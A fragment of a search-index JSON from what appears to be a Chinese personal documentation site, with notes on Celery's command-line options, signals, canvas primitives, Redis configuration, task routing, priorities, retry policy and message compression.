python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html"},{"title":"命令行选项说明","text":"语法, Celery command entrypoint celery [OPTIONS] COMMAND [ARGS]... 选项参数 -A , --app 指定运行的 Celery 应用程序实例，格式必须为 module.path:attribute\n但如果只设置包名，它将进行搜索app实例, 详细见 app_args -b , --broker TEXT, 中间人, 会覆盖代码里的配置 --result-backend TEXT, 结果后端 --loader TEXT --config TEXT --workdir PATH, 工作目录 -C , --no-color 无颜色? -q , --quiet 安静模式? --version 版本信息 --help Show this message and exit. 支持的命令 关于 app 参数说明: 使用 --app 参数可也指定运行的 Celery 应用程序实例，格式必须为 module.path:attribute\n但如果只设置包名，它将进行搜索app实例，顺序如下: 用 --app=proj: 名为 proj.app 的属性.\n名为 proj.celery 的属性\n模块 proj 中值为 Celery 应用程序的任何属性，如果还没有找到，将尝试检索名为 proj.celery的子模块\n名为 proj.celery.app 的属性\n名为 proj.celery.celery 的属性\n模块 proj.celery 中值为 Celery 应用程序的任何属性\n在此方案模仿文档中使用的实例，即 针对单个模块包含的proj:app ，以及 大型项目的 proj.celery:app 注解 使用 celery 5.2 貌似不能自动识别 proj.app 了. 自动识别的话只能写 celery.py 支持的命令 Commands: amqp     打开 AMQP Shell.\nbeat     启动节拍周期任务调度程序.\ncall     命令行调用一个任务.\ncontrol  Workers 远程控制.\nevents   事件流实用程序.\ngraph    The ``celery graph`` command.\ninspect  检查运行的Worker.\nlist     从中间人 broker 获取信息.\nlogtool  The ``celery logtool`` command.\nmigrate  将任务从一个 broker 迁移到另一个 代理(broker).\nmulti    启动多个 worker 实例.\npurge    清除所有已知任务队列中的所有消息.\nreport   显示可包括在错误报告中的有用信息.\nresult   打印给定 任务ID(task id) 的返回值.\nshell    打开一个 shell 会话来便捷访问 celery.\nstatus   查看所有 workers 状态.\nupgrade  查看版本升级信息.\nworker   启动 worker 实例. 注解 注意, 像 status 这样的命令需要手动指定配置: % celery -b redis://localhost:6379/0 status\n->  celery@yanquedembp.local: OK\n\n1 node online. 若使用配置文件: % celery --config  src.time_schedule.celery_conf status\n->  celery@yanquedembp.local: OK\n\n1 node online. 或者直接指定应用: % celery -A src.time_schedule  status\n->  celery@yanquedembp.local: OK\n\n1 node online. worker 用法: celery worker [OPTIONS] 启动一个 worker 实例. Examples: $ celery --app=proj worker -l INFO\n$ celery -A proj worker -l INFO -Q hipri,lopri\n$ celery -A proj worker --concurrency=4\n$ celery -A proj worker --concurrency=1000 -P eventlet\n$ celery worker --autoscale=10,0 消费者选项 Worker Options: -n , --hostname HOSTNAME 设定自定义主机名 (e.g., w1@%%h ).\nExpands: %%h (hostname), %%n (name) and %%d,\n(domain). -D , --detach 以后台进程的形式启动\nStart worker as a background process. -S , --statedb PATH 状态数据库的路径, 文件为 db 后缀\nPath to the state database. The extension\n'.db' may be appended to the filename. -O <[default|fair]> 应用优化配置文件. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> 日志等级. --prefetch-multiplier <prefetch multiplier> Set custom prefetch multiplier value for\nthis worker instance.\n这个没懂 线程/进程池选项 Pool Options: -c , --concurrency <concurrency> 队列的进程数目, 默认为CPU个数. -P , --pool <[prefork|eventlet|gevent|solo|processes|threads]> 使用那种池方式. 进程池/线程池/时间池. -E , --task-events , --events 发送任务相关的时间能够被 (celery 事件、 celerymon、 other) 监视捕获 --time-limit FLOAT 强制设置任务时间限制. 单位: 秒; 类型: int/float --soft-time-limit FLOAT 设置软时间限制. 单位: 秒; 类型: int/float. 不知道与上一个区别在哪. --max-tasks-per-child INTEGER 每个消费者池能够执行的最大任务数, 若超过将会使用一个新的消费者进程池(worker)替代 --max-memory-per-child INTEGER 最大驻留内存. 单位: Kib.\n若耗尽将会使用一个新的 消费者进程池(worker).\n若存在单个任务就超过了最大驻留内存, 在完成此任务后,\n才会使用新的 消费者进程池(worker) 来替换.\n默认无限制. 队列选项 Queue Options: -Q , --queues <COMMA SEPARATED LIST> 队列, 多个使用逗号分隔 -X , --exclude-queues <COMMA SEPARATED LIST> 排除队列, 多个使用逗号分隔 -I , --include <COMMA SEPARATED LIST> 包含队列, 多个使用逗号分隔 --purge , --discard 清除队列, 多个使用逗号分隔 --discard 清除队列, 多个使用逗号分隔 功能: --without-gossip\n--without-mingle\n--without-heartbeat\n--heartbeat-interval INTEGER\n--autoscale <MIN WORKERS>, <MAX WORKERS> Embedded Beat Options: -B, --beat\n-s, --schedule-filename, --schedule TEXT\n--scheduler TEXT Daemonization Options: -f, --logfile TEXT\n--pidfile TEXT\n--uid TEXT\n--uid TEXT\n--gid TEXT\n--umask TEXT\n--executable TEXT beat 用法: celery beat [OPTIONS] 启动周期任务调度, 设置 contrab 任务等定时任务时, 需要使用此命令来发现注册定时任务. Beat Options: --detach 作为守护进程独立执行 -s , --schedule TEXT 执行数据库的路径.\n默认为 celerybeat-schedule .\nThe extension '.db' may be\nappended to the filename. -S , --scheduler TEXT 使用哪个调度器(scheduler)类 --max-interval INTEGER 调度器轮询的间隔时间.\n不确定是每次任务周期的间隔(多个任务都执行完成一次, 组成一个任务周期),\n还是每个任务之间的间隔. 应是后者. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> 日志等级 守护线程执行选项 Daemonization Options: -f , --logfile TEXT 日志文件名 --pidfile TEXT pid文件名 --uid TEXT uid --gid TEXT gid --umask TEXT 创建文件的umask值 --executable TEXT 不知道... status 用法: celery status [OPTIONS] 查看在线的 Worker 节点. 远程控制选项 Remote Control Options: -t , --timeout FLOAT 设置检查超时时间. -d , --destination <COMMA SEPARATED LIST> 检查的目标节点列表. 逗号分隔. -j , --json 使用json格式输出. graph 用法: celery graph [OPTIONS] COMMAND [ARGS]... 图形化显示?\n实际使用效果是json格式的相关输出信息. 命令: bootsteps  显示引导步骤图.\nworkers    显示 workers graph. 例: celery --config  src.time_schedule.celery_conf graph workers call 使用: celery call [OPTIONS] NAME 根据任务名调用任务. 调用选项 Calling Options: -a , --args <JSON ARRAY> 位置参数. -k , --kwargs <JSON OBJECT> 关键字参数字典. --eta ISO-86091 执行时间. --countdown FLOAT eta in seconds from now. --expires <ISO-86091 OR FLOAT> 过期时间. --serializer TEXT 任务序列化方式. 路由选项 Routing Options: --queue TEXT 自定义队列名. --exchange TEXT 自定义交换机名. --routing-key TEXT 路由key. 例: celery -A src.time_schedule call -a '[2, 2]'  src.time_schedule.pre_tasks.add\n7506ef60-5621-460a-8219-7a97f6e96f4e 公共选项 --help Show this message and exit. 一些常用命令 设置并发数 worker -c 设置并发数, 默认数为cpu数: -c, --concurrency <concurrency>\n                                Number of child processes processing the\n                                queue.  The default is the number of CPUs\n                                available on your system. 设置日志级别 worker -l 设置日志信息: -l, --loglevel [DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]\n                                Logging level. 后台运行 celery multi 后台运行, 但是看新版本指令帮助信息貌似又不支持: celery multi --help\nUsage: celery multi [OPTIONS]\n\n  Start multiple worker instances.\n\nOptions:\n  --help  Show this message and exit. 启动: celery multi start w1 -A proj -l info 重启: celery  multi restart w1 -A proj -l info 停止运行: $ celery multi stop w1 -A proj -l info stop 命令是异步的，所以不会等待职程（Worker）关闭。可以通过 stopwait 命令进行停止运行，可以保证在退出之前完成当前正在执行的任务: $ celery multi stopwait w1 -A proj -l info 默认情况下会在当前目录中创建pid文件和日志文件，为防止多个职程（Worker）干扰，建议将这些文件存放在专门的目录中: $ mkdir -p /var/run/celery\n$ mkdir -p /var/log/celery\n$ celery multi start w1 -A proj -l info --pidfile=/var/run/celery/%n.pid \\\n                                        --logfile=/var/log/celery/%n%I.log 也可以使用 multi 命令启动多个职程（Worker），有一个强大的语法为不同职程（Worker）设置不同的参数: $ celery multi start 10 -A proj -l info -Q:1-3 images,video -Q:4,5 data \\\n    -Q default -L:4,5 debug","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html"},{"title":"自定义异常","text":"Python 的异常必须要符合一些简单规则，才能被 pickle 模块支持以及序列化。 使用 Pickle 作为序列化器时，引发不可拾取异常的任务将无法正常工作。 为确保异常是可被处理的，异常必须要在 .args 属性中提供初始化的参数。最简单的方法就是使用异常调用 Exception.__init__ 让我们来看一些有用的例子，还有一个不适用的例子: # OK:\nclass HttpError(Exception):\n    pass\n\n# BAD:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n\n# OK:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n        Exception.__init__(self, status_code)  # <-- REQUIRED 所以规则是：对于任何支持自定义参数 *args 的异常，都必须使用 Exception.__init__(self, *args) 关键字参数没有特殊支持，如果需要保存关键字参数，当异常被 unpickled 时，需要将它们作为普通的参数进行传递: class HttpError(Exception):\n\n    def __init__(self, status_code, headers=None, body=None):\n        self.status_code = status_code\n        self.headers = headers\n        self.body = body\n\n        super(HttpError, self).__init__(status_code, headers, body)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html"},{"title":"信号","text":"当某些动作在应用中的其他位置触发时，信号允许解耦的应用接收到通知。 Celery 附带了很多信号，您的应用可以嵌入这些信号来增加某些动作的额外行为。 基本 一些事件触发信号，你可以连接到这些信号以在它们被触发时执行一些操作。\n连接到 after_task_publish 信号的示例: from celery.signals import after_task_publish\n\n@after_task_publish.connect\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # 任务的信息位于任务信息的标题中\n    # 使用第二版的任务协议.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    )) 一些信号也有一个你可以进行过滤的发送者。\n比如 after_task_publish  信号使用任务的名称作为发送者，所以通过提供发送者的参数进行连接，你可以在每次名称为 proj.tasks.add 的任务被发布时连接要被调用的处理函数: @after_task_publish.connect(sender='proj.tasks.add')\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # information about task are located in headers for task messages\n    # using the task protocol version 2.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    )) 信号使用与 django.core.dispatch 相同的实现，所以在默认情况下，其他的关键字参数(如 singal) 将被传递到所有的信号处理函数里。 信号处理的最佳实践是接受任意的关键字参数(如, **kwargs)。这种方式使得新的 Celery 版本可以在不影响用户代码的情况下添加可选参数。 任务信号 before_task_publish 在 3.1 版本引入 在任务发布之前派发。注意，这是在发送任务的过程中执行的。 发送者时被发布的任务的名称。 提供的参数: body 任务消息体\n这是一个包含任务消息字段的映射，有关定义的可能字段的参考，请参阅 Version 2  和 Version 1。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html"},{"title":"canvas","text":"celery 的 canvas 应当值得是一种设计流程, 目前不是很理解. 签名 有时候可能希望将任务调用的签名传递给另外一个进程或其他函数的参数，Celery 提供了签名。 签名通过一种方式进行封装任务调用的参数以及执行选项，便于传递给他的函数，甚至通过序列化通过网络传送。 可以将 add 使用的参数作为任务创建的签名，倒计时为 10 秒，如下所示（2,2）: >>> add.signature((2, 2), countdown=10)\ntasks.add(2, 2) 也可以通过一个快捷的方式进行操作: >>> add.s(2, 2)\ntasks.add(2, 2) 签名实例支持调用API：这就意味着可以使用 delay 和 apply_async 方法。\n但区别就在于签名实例已经指定了参数签名，该 add 任务有两个参数，需要指定两个参数的签名才能够成一个完整的签名实例: >>> s1 = add.s(2, 2)\n>>> res = s1.delay()\n>>> res.get()\n4 也可以创建不完整的签名来进行创建: # incomplete partial: add(?, 2)\n>>> s2 = add.s(2) 也可以设置新的参值，新设置的参数会覆盖原有的参数值: >>> s3 = add.s(2, 2, debug=True)\n>>> s3.delay(debug=False)   # debug is now False. 不变签名 不变性(Immutability) 部分参数通常在回调中使用，父任务的结果将会作为参数传递给链接或chord的回调任务。 有时你希望指明一个不需要参数的回调，这时你可以设置签名为不变的: >>> add.apply_async((2, 2), link=reset_buffers.signature(immutable=True)) 快捷方式 .si() 也能创建不变签名: >>> add.apply_async((2, 2), link=reset_buffers.si()) 对于不变签名，只有执行选项可以进行设置，并无法使用部分参数和关键词参数。 回调 任务可以使用 apply_async 的 link 参数来添加回调: add.apply_async((2, 2), link=other_task.s()) 只有当任务成功退出，回调函数才能被执行，并且将父任务的结果作为参数传递给回调的任务。\n如前所述，新传递的参数将会添加在签名指定的参数前。\n如果你有一个签名: >>> sig = add.s(10) 接着 sig.delay(result) 将变为: >>> add.apply_async(args=(result, 10)) 现在，让我们调用 add 任务，并设置回调: >>> add.apply_async((2, 2), link=add.s(8)) 正如预期，首先第一个任务将会计算 2 + 2，接着回调任务将会计算 4 + 8。 组 组：Groups 一个 group 并行调用任务列表，返回一个特殊的结果实例，可以将结果作为一个列表进行查看，并且通过索引进去获取返回值: >>> from celery import group, add\n>>> group(add.s(i, i) for i in xrange(10))().get()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18] Partial group: >>> g = group(add.s(i) for i in xrange(10))\n>>> g(10).get()\n[10, 11, 12, 13, 14, 15, 16, 17, 18, 19] 链 链：Chains 可以将任务链接在一起，在一个人返回后进行调用另外一个任务: >>> from celery import chain\n>>> from proj.tasks import add, mul\n\n# (4 + 4) * 8\n>>> chain(add.s(4, 4) | mul.s(8))().get()\n64 或 partial chain: >>> # (? + 4) * 8\n>>> g = chain(add.s(4) | mul.s(8))\n>>> g(4).get()\n64 链也可以这样写: >>> (add.s(4, 4) | mul.s(8))().get()\n64 和弦 和弦：Chords\n和弦是一个带有回调的组: >>> from celery import chord\n>>> from proj.tasks import add, xsum\n\n>>> chord((add.s(i, i) for i in xrange(10)), xsum.s())().get()\n90 链接到其他任务的组将自动转换为和弦: >>> (group(add.s(i, i) for i in xrange(10)) | xsum.s())().get()\n90 这些原语都是签名的类型，可以根据需要进行组合，例如: >>> upload_document.s(file) | group(apply_filter.s() for filter in filters)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html"},{"title":"并发","text":"基于 Eventlet 的并发 Celery 支持 Eventlet 作为可选执行池的实现，在某些情况下要优于 prefork 。\n但是你需要确保一项任务不会太长时间阻塞事件循环。\n一般来说，与 CPU 绑定的操作不适用与 Eventlet。\n并且还要注意的是，一些第三方的库，通常指带有C扩展的，由于无法使用猴子补丁，因此不能从使用 Eventet 中获得益处。\n如果你无法确定，可以参考它们的官方文档。\n如 pylibmc 不允许于 Eventlet 一起使 用，但是 psycopg2 可以，虽然它们都是带有 C 扩展的库。 prefork 池是利用多进程，但是数量受限于每个 CPU 只能有几个进程。\n使用 Eventlet，您可以有效地产生数百或者数千个绿色线程。\n在一个动态中转系统的非正式测试中，Eventlet 池可以每秒获取并处理数百个动态，而 prefork 池处理 100 条动态花费了14秒之多。\n但请注意，这是 异步 I/O 的优势所在(异步的HTTP请求)。\n您也许需要将 Eventlet 和 prefork 职程搭配使用，并根据兼容性或者最适合处理的角度来路由任务。 启用 Eventlet 你可以使用 Celery 的职程参数 -P 来启用 Eventlet: $ celery -A proj worker -P eventlet -c 1000 示例 有关使用 Eventlet  支持的示例，请参阅 Celery 发行版本的 Eventlet 示例 文件夹","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html"},{"title":"基于redis的配置","text":"此处只介绍redis相关配置, 更多配置见 conf_celery redis相关配置 默认使用的 rabbitmq, 所以用 redis 需要先安装以来库(若没安装): pip install celery[redis] 代码里的配置: app.conf.broker_url = 'redis://localhost:6379/0' 此url格式为: redis://:password@hostname:port/db_number 默认使用的是 localhost 的 6379 端口中 0 数据库。（ Redis 默认有 16 个数据库） 可以通过 Uninx 套接字进行连接，URl 格式如下: redis+socket:///path/to/redis.sock 可以通过设置 virtual_host参数添加到URL上进行指定使用时 Uninx 套接字连接的数据库编号: redis+socket:///path/to/redis.sock?virtual_host=db_number Celery 也可以连接 Redis 哨兵也是非常简单的: app.conf.broker_url = 'sentinel://localhost:26379;sentinel://localhost:26380;sentinel://localhost:26381'\napp.conf.broker_transport_options = {'master_name':'cluster1'}","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html"},{"title":"配置","text":"支持的一种配置形式: 输入端 -> Broker\n输出端 -> 结果后端 支持的配置 task_serializer , 序列化方式 result_serializer 结果后端的序列化方式 timezone, 时区 task_annotations, 详细指定多个任务配置, 如 任务限速 task_routes, 路由 broker_transport_options, 可见性超时 result_backend, 结果后端配置: 返回结果 task_publish_retry, 是否失败重试, 默认为 True task_publish_retry_policy, 失败重试策略 task_compression, 压缩 序列化方式 task_serializer, 默认为json 在客户端和工作人员之间传输的数据需要进行序列化，\n因此 Celery 中的每条消息都有一个 content_type 标头，\n该标头描述了用于对其进行编码的序列化方法。 默认的序列化器是JSON，但是您可以使用 task_serializer 设置更改此设置，或者针对每个任务，甚至针对每条消息进行更改。 有内置的支持JSON，pickle，YAML 和msgpack 每个序列化器都有其优点和缺点: json - JSON 被大多数的编程语言支持，并且现在是 Python 标准的一部分（自2.6开始），\n并且现代 Python 库（例如 simplejson）具有非常快的 json 解析速度。 JSON 的缺点是会限制你使用如下的数据类型：字符串、Unicode、字典和列表。小数和日期明显缺失。\n二进制数据使用 Base64 编码进行传输，这与支持纯二进制传输的相比，数据传输量增长了34%。\n但如果你的数据满足上述限制，并且你需要跨语言支持，则 JSON 可能是你的最佳选择。\n有关更多信息，请参见 http://json.org pickle - 如果你除了 Python 外，并不需要支持其他语言，\n那么使用 pickle 编码将让你获得对所有 Python 内建类型的支持（类实例除外）。 相比 JSON，使用 pickle 序列化的二进制文件更小，传输速度更快。\n请参阅 pickle 获得更多信息 yaml - YAML 和 JSON 有许多相似的特征，yaml 支持包括日期、递归引用在内的更多数据类型。\n然而，Python 的 YMAL 库相比 JSON 库 要慢很多。 如果你需要更具表现能力的数据集合，则 YMAL 比上面的序列化方式更适合。\n有关更多信息，请参见 http://yaml.org/ msgpack - msgpack 是一种接近 JSON 的二进制序列化格式。但是，它还很年轻，因此此时应该将支持视为实验性的\n有关更多信息，请参见 http://msgpack.org/ 编码类型可以用作消息头，因此 workers 知道如何反序列化所有的任务。如果你使用自定义序列方案，则该序列化必须被 workers 支持。\n发送任务时的序列化配置优先级如下（从高到低）: serializer 执行选项。 Task.serializer 属性。 task_serializer 属性。 为单个任务调用设置序列化方式: >>> add.apply_async((10, 10), serializer='json') 任务限速 任务限速除了: task_annotations = {\n    'tasks.add': {'rate_limit': '10/m'}\n} 还可以在启动时设置(仅适用 RabbitMQ 或 Redis): $ celery -A tasks control rate_limit tasks.add 10/m\nworker@example.com: OK\n    new rate limit set successfully 时区 内部和消息中的所有的时间和日期使用的都是 UTC 时区。 当职程（Worker）收到消息时，例如倒计时设置，会将 UTC 时间转换为本地时间。\n如果需要使用与系统不同的时区，可以通过 timezone进行配置: app.conf.timezone = 'Europe/London' 路由 Celery 支持 AMQP 中提供的所有路由，可以将消息发送到指定的任务队列路由。 通过 task_routes 可以设置一个按名称分配的路由任务队列，将所有的内容集中存放在一个位置: app.conf.update(\n    task_routes = {\n        'proj.tasks.add': {'queue': 'hipri'},\n    },\n) 可以在程序是使用 queue 参数进行指定队列: >>> from proj.tasks import add\n>>> add.apply_async((2, 2), queue='hipri') 可以通过设置运行职程（Worker）时指定职程（Worker）从某个队列中进行消费（celery worker -Q）: $ celery -A proj worker -Q hipri 也可以通过\",\"作为分割符进行设置多个队列，\n例如，可以将默认队列和 hipri 队列一起通过职程（Worker）进行消费，\n其中默认队列 celery 由于历史原因被命名: $ celery -A proj worker -Q hipri,celery 队列名称的顺序不分前后，职程（Worker）给予队列分配的权重是相同的。\n相关路由的信息以及使用 AMQP 路由的全部功能，详情请参考路由任务: 官网中文翻译文档-路由 自动路由 最简单的路由方式是使用选项 task_create_missing_queues 进行设置(默认情况下，此设置为打开状态)。 如果启用了该参数，将会自动创建没有在 task_queues 选项中定义的命名队列。这样可以更加容易的执行简单的路由任务。 假如你有两个处理常规任务的服务器 x 和 y ，以及一个只处理与 feed 相关的任务的服务器 z 。那么你可以使用这样的配置: task_routes = {'feed.tasks.import_feed': {'queue': 'feeds'}} 启用这样的路由设置后，import_feed 的任务将会被路由到 feeds 队列中，\n而其他的任务将会被路由到默认的队列(因为历史原因被命名为celery)。 另外，你还可以使用通配符，甚至正则表达式来匹配所有在 feed.tasks 命名空间内的所有任务: app.conf.task_routes = {'feed.tasks.*': {'queue': 'feeds'}} 如果匹配模式的顺序很重要，你应该使用列表的方式指定路由的次序: task_routes = ([\n    ('feed.tasks.*', {'queue': 'feeds'}),\n    ('web.tasks.*', {'queue': 'web'}),\n    (re.compile(r'(video|image)\\.tasks\\..*'), {'queue': 'media'}),\n],) 安装完路由之后，你可以按照如下方式启动服务器 z 来只处理 feeds 队列的消息: user@z:/$  celery -A proj worker -Q feeds 你可以指定任意数量的队列，所以你也可以让这个服务器去处理来自默认队列的消息: user@z:/$  celery -A proj worker -Q feeds,celery 修改默认队列的名称 你可以使用如下的配置来修改默认队列的名称: app.conf.task_default_queue = 'default' 定义队列 这部分的特性主要是隐藏复杂的 AMPQ 协议实现，只对用户暴露出需要的基础用法。但是，你可能仍然对队列是如何被声明的原理感兴趣。\n使用如下的配置将会创建一个名为 video 的队列: {\n  'exchange': 'video',\n  'exchange_type': 'direct',\n  'routing_key': 'video'\n} 对于那些非 AMPQ 的后端组件如 Redis 或者 SQS 并不支持交换机，所以他们要求交换机的名称与队列的名称一致。\n使用这种设计可以确保正常的处理不同的情况。 手动路由 假设你有两台处理常规任务的服务器，x 和 y，以及另一台只处理与 feed 相关的任务，你可以使用如下的配置: from kombu import Queue\n\napp.conf.task_default_queue = 'default'\napp.conf.task_queues = (\n    Queue('default',    routing_key='task.#'),\n    Queue('feed_tasks', routing_key='feed.#'),\n)\ntask_default_exchange = 'tasks'\ntask_default_exchange_type = 'topic'\ntask_default_routing_key = 'task.default' task_queues 是一个包含 Queue 实例的列表。如果你不想指定 exchange 和 exchange_type 的值。\n这些变量将会被 task_default_exchange 和 task_default_exchange_type 来设置。 要将一个任务路由到 feed_tasks 队列中，你可以在task_routes配置中添加一个入口: task_routes = {\n        'feeds.tasks.import_feed': {\n            'queue': 'feed_tasks',\n            'routing_key': 'feed.import',\n        },\n} 还可以使用 Task.apply_async() 或者 send_task() 中的 routing_key 参数来重载这些设置: >>> from feeds.tasks import import_feed\n>>> import_feed.apply_async(args=['http://cnn.com/rss'],\n...                         queue='feed_tasks',\n...                         routing_key='feed.import') 要使服务器 z 只处理来自 feed 队列的消息，你可以使用 celery worker -Q 来启动服务: user@z:/$ celery -A proj worker -Q feed_tasks --hostname=z@%h 服务器 x 和 y 需要配置为从默认的队列中消费消息: user@x:/$ celery -A proj worker -Q default --hostname=x@%h\nuser@y:/$ celery -A proj worker -Q default --hostname=y@%h 也可以让 feed 消息的处理职程去处理常规消息，比如在某个时间出现很多任务需要去做: user@z:/$ celery -A proj worker -Q feed_tasks,default --hostname=z@%h 如果你想添加配置了另一个交换机的队列，只需要指定自定义的 exchange 和 exchange_type from kombu import Exchange, Queue\n\napp.conf.task_queues = (\n    Queue('feed_tasks',    routing_key='feed.#'),\n    Queue('regular_tasks', routing_key='task.#'),\n    Queue('image_tasks',   exchange=Exchange('mediatasks', type='direct'),\n                          routing_key='image.compress'),\n) 如果你对这些术语感到迷惑，你应该阅读一下 AMPQ. 注解 此处建议看一下: Redis Message Priorities 特殊的路由选项 RabbitMQ 消息优先级 支持的中间人(Broker): RabbitMQ 从 4.0 版本开始引入。 队列可以通过设置 x-max-priority 参数来支持优先级: from kombu import Exchange, Queue\n\napp.conf.task_queues = [\n    Queue('tasks', Exchange('tasks'), routing_key='tasks',\n          queue_arguments={'x-max-priority': 10}),\n] 可以通过指定参数 task_default_priority 来设置所有队列的默认最大优先级: app.conf.task_queue_max_priority = 10 可以通过指定参数 task_default_priority 来设置所有任务的默认优先级: app.conf.task_default_priority = 5 Redis 消息优先级 支持的中间人(Broker): Redis 虽然 Celery 的 Redis 中间人(Broker) 支持了优先级的字段，但是 Redis 本身并没有优先级的概念。\n所以在尝试使用 Redis 来实现优先级之前，请阅读下方的说明，因为你可能遇到一些意想不到的行为。 优先级的支持是通过为每个队列创建 n 个列表来实现的。\n也就是说即使存在 10(0-9) 个优先级别，在默认情况下也会被合并成 4 个级别来节省资源。\n也就是说一个名为 celery 的队列将会分成 4 个队列: ['celery0', 'celery3', 'celery6', 'celery9'] 如果你想要更多的优先级别，你可以通过设置中间人(Broker)参数 priority_steps 来实现: app.conf.broker_transport_options = {\n    'priority_steps': list(range(10)),\n} 这就是说，要注意到这样的实现永远不如在服务器端实现优先级别，只能近似说是最佳的实现。但是这对于你的应用来说也足够好了。 可见性超时 可见性超时为将消息重新下发给另外一个程序之前等待确认的任务秒数 可以通过 broker_transport_options 选项进行修改: app.conf.broker_transport_options = {'visibility_timeout': 3600} # 一个小时 默认的可见性超时时间为1个小时。 返回结果 如果您想保存任务执行返回结果保存到Redis，您需要进行以下配置: app.conf.result_backend = 'redis://localhost:6379/0' 有关 Redis 保存结果的完整选项列表，请查阅 Redis后端配置。\n如果您使用的是 Redis 哨兵默认是，则需要使用 result_backend_transport_options 进行指定 master_name: app.conf.result_backend_transport_options = {'master_name': \"mymaster\"} 注解 可以通过配置 task_ignore_result 来全局禁用结果/返回值 单个禁用直接 @app.task(ignore_result=True) 即可 在调用apply_async和delay执行任务时, 通过传递ignore_result参数, 可以在每次执行的基础上设置开启/禁用任务结果: @app.task\ndef mytask(x, y):\n    return x + y\n\n# No result will be stored\nresult = mytask.apply_async(1, 2, ignore_result=True)\nprint result.get() # -> None\n\n# Result will be stored\nresult = mytask.apply_async(1, 2, ignore_result=False)\nprint result.get() # -> 3 默认情况下， 当配置了 backend ，任务将不会忽略结果( ignore_result=False ) 选项优先顺序如下(从低到高): 全局选项 task_ignore_result 任务配置 ignore_result 任务执行时选项 ignore_result 失败重试策略 task_publish_retry_policy 支持的键为: max_retries: int = 3 最大重试次数，在这种情况下，将抛出重试失败的异常。 值为None意味着它将永远重试。 interval_start: int = 0 定义两次重试之间要等待的秒数（浮点数或整数）。默认值为0（第一次重试是瞬时的）。 interval_step: float = 0.2 在每次连续重试时，此数字将被添加到重试延迟中（浮点数或整数）。默认值为0.2。 interval_max: float=0.2 重试之间等待的最大秒数（浮点数或整数）。默认值为0.2。 例: add.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'interval_start': 0,\n    'interval_step': 0.2,\n    'interval_max': 0.2,\n}) 重试的最长时间为0.4秒。\n默认情况下将其设置为相对较短，因为如果代理连接断开，连接失败可能导致重试堆效应–\n例如，许多 Web 服务器进程正在等待重试，从而阻止了其他传入请求。 压缩 task_compression Celery 可以使用以下内建方案压缩消息。 brotli bzip2 gzip lzma zlib zstd 你还可以创建自己的压缩方式，并在kumbo压缩注册中注册它们。\n发送任务时的压缩方案配置优先级如下（从高到低）: compression 执行选项。 Task.compression 属性。 task_compression 属性。 任务调用时指定压缩方法的示例: >>> add.apply_async((2, 2), compression='zlib') brotli brotli 针对 web 进行了优化，尤其是小型文档。该压缩对诸如字体、html页面等静态内容最有效。\n要使用 brotli，请用以下命令进行安装: $ pip install celery[brotli] bzip2 bzip2 创建的文件比 gzip 小，但是压缩和解压的速度明显慢于 gzip。 要使用 bzip2，请确保 bzip2 已经编译到你的 Python 可执行文件中。\n如果你得到以下错误 ImportError: >>> import bz2\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'bz2' 这意味着你应该重新编译支持 bzip2 的 Python 版本。 gzip gzip 适用于内存占用较小的系统，因此 gzip 非常适合内存有限的系统。该压缩常用语生成带有 \".tar.gz\" 后缀的文件。 要使用 gzip，请确保 gzip 已经编译到你的 Python 可执行文件中。 如果你得到以下错误: >>> import gzip\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'gzip' 这意味着你应该重新编译支持 gzip 的 Python 版本。 lzma lzma 具有较好的压缩效率以及压缩解压速度，但内存消耗更大。\n要使用 lzma，请确保 gzip 已经编译到你的 Python 可执行文件中，并且你的 Python 版本为3.3或更高版本。\n如果你得到以下错误 ImportError: >>> import lzma\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'lzma' 这意味着你应该重新编译支持 lzam 的 Python 版本。\n也可以通过以下的方式进行安装: $ pip install celery[lzma] zlib zlib 是 Deflate 算法的抽象，它的 API 支持包括 gzip 格式和轻量级流格式文件的支持。\nzlib 是许多软件系统的重要组成部分，例如 Linux 内核以及 Git VCS。 要使用 zlib，请确保 zlib 已经编译到你的 Python 可执行文件中。\n如果你得到以下错误 ImportError: >>> import zlib\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'zlib' 这意味着你应该重新编译支持 zlib 的 Python 版本。 zstd zstd是一个针对 zlib 的实时压缩方案，且有着更好的压缩效率。zstd 由 Huff0 和 FSE 库提供快速算法。\n要使用zstd，请用以下命令进行安装: $ pip install celery[zstd] 支持的配置方式 硬编码 使用配置文件 硬编码 指定序列化方式为json: 